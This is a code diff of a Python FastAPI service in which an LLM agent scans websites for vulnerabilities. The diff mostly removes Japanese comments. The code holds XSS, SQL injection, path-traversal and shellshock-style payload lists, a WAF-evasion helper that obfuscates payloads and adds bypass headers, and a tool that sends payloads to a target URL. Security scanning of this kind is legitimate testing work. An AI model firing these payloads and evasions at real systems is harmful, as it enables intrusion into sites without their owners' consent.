@@ -13,7 +13,7 @@ import random
 import string
 import time
 from urllib.parse import quote_plus
-import json # JSONを扱うためにインポート
+import json
 
 from langchain_google_genai import ChatGoogleGenerativeAI
 from langchain.agents import AgentExecutor, create_tool_calling_agent
@@ -21,15 +21,13 @@ from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
 from langchain_core.tools import tool
 from langchain.memory import ConversationBufferMemory
 
-# --- FastAPIとAPIRouterのインスタンスを生成 ---
 load_dotenv()
 app = FastAPI()
 router = APIRouter()
 
-# --- WAFバイパス手法を適用するヘルパー関数 ---
 def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
     """
-    指定されたバイパス手法をペイロードに適用する。
+    WAFバイパス手法をペイロードに適用する。精度低いので改善しなければ
     """
     if bypass_technique == "case_obfuscation":
         return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
@@ -44,7 +42,7 @@ def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
 # --- 脆弱性ペイロード生成関数 ---
 def generate_xss_payloads() -> List[str]:
     """
-    XSS攻撃用のより広範なペイロードリストを生成する。
+    TODO XSS攻撃用のより広範なペイロードリストをつくる
     """
     return [
         "<script>alert('XSS')</script>",
@@ -65,7 +63,7 @@ def generate_xss_payloads() -> List[str]:
 
 def generate_sqli_payloads() -> List[str]:
     """
-    SQLi攻撃用のより広範なペイロードリストを生成する。
+    TODO SQLi攻撃用のより広範なペイロードリストをつくる
     """
     return [
         "' OR 1=1--",
@@ -87,7 +85,7 @@ def generate_sqli_payloads() -> List[str]:
 
 def generate_lfi_payloads() -> List[str]:
     """
-    LFI（ローカルファイルインクルージョン）攻撃用のペイロードリストを生成する。
+    正直ここはあんまりきたいしてない
     """
     return [
         "../../../../etc/passwd",
@@ -113,7 +111,6 @@ def generate_rce_payloads() -> List[str]:
         "() { :; }; /bin/eject",
     ]
 
-# --- ツール定義 ---
 @tool
 async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
     """
@@ -129,21 +126,17 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
     ]
 
     try:
-        # dataがJSON文字列形式であることを確認し、辞書に変換
         data_dict = json.loads(data) if data else {}
     except (json.JSONDecodeError, TypeError):
         return f"Error: The 'data' parameter must be a valid JSON string. Received: {data}"
         
     async with httpx.AsyncClient() as client:
         try:
-            # WAFバイパスなしの初回リクエスト
             initial_response_data = {k: v for k, v in data_dict.items()} if data_dict else None
             initial_response = await client.request(method.upper(), url, data=initial_response_data, headers=headers, timeout=15)
             
-            # WAFバイパス手法を試行
             for technique in bypass_techniques:
                 for bypass_headers in bypass_headers_list:
-                    # ペイロード値のみにバイパス手法を適用
                     modified_data_dict = {k: apply_waf_bypass(v, technique) for k, v in data_dict.items()} if data_dict else None
                     
                     combined_headers = {**(headers or {}), **bypass_headers}
@@ -196,7 +189,7 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
 @tool
 async def detect_waf(url: str) -> str:
     """
-    指定されたURLに対してWAF (Web Application Firewall) の有無を検出する。
+    WAFの有無を検出する。
     """
     try:
         async with httpx.AsyncClient() as client:
@@ -209,7 +202,6 @@ async def detect_waf(url: str) -> str:
     except httpx.RequestError as e:
         raise HTTPException(status_code=500, detail=f"WAF detection error: {e}")
 
-# --- Pydantic モデル定義 (変更なし) ---
 class TechStackItem(BaseModel):
     name: str = Field(..., description="技術スタックの名前 (例: 'PHP', 'WordPress')")
     version: Optional[str] = Field(None, description="バージョン情報")
@@ -219,7 +211,6 @@ class ScanInput(BaseModel):
     tech_stack: Optional[List[TechStackItem]] = Field(None, description="ターゲットの技術スタック情報")
     vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf", "lfi", "rce"], description="診断する脆弱性タイプ")
 
-# --- APIエンドポイント ---
 @router.post("/start_scan")
 async def start_scan(scan_input: ScanInput):
     llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
@@ -254,13 +245,11 @@ async def start_scan(scan_input: ScanInput):
         memory=memory
     )
     
-    # --- すべてのペイロードを生成 ---
     all_xss_payloads = generate_xss_payloads()
     all_sqli_payloads = generate_sqli_payloads()
     all_lfi_payloads = generate_lfi_payloads()
     all_rce_payloads = generate_rce_payloads()
     
-    # --- プロンプトにすべてのペイロードリストを含める ---
     tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in scan_input.tech_stack]) if scan_input.tech_stack else "情報なし"
     
     initial_query = f"""
@@ -295,7 +284,6 @@ async def serve_frontend():
     """
     return HTMLResponse(content=html_content)
 
-# --- FastAPI ルーティング (変更なし) ---
 app.include_router(router)
 
 if __name__ == "__main__":
